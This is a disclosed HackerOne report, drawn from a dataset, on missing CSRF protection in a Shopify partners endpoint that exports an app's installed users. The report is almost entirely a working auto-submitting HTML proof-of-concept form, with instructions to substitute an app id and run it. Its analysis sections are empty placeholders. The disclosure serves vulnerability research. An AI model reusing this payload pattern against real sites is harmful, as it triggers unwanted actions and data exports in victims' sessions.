---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '96470'
original_report_id: '96470'
title: Missing of csrf protection
weakness: Cross-Site Request Forgery (CSRF)
team_handle: shopify
created_at: '2015-10-29T09:27:47.934Z'
disclosed_at: '2015-12-07T21:26:35.535Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Missing of csrf protection

## Metadata

- HackerOne Report ID: 96470
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: shopify
- Disclosed At: 2015-12-07T21:26:35.535Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

<html>
<head><title>csrf</title></head>
<body onLoad="document.forms[0].submit()">
<form action="https://app.shopify.com/services/partners/api_clients/1105664/export_installed_users" method="GET">
</form>
</body>
</html>

change the 1105664 app id to your app id the save as html file and run

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
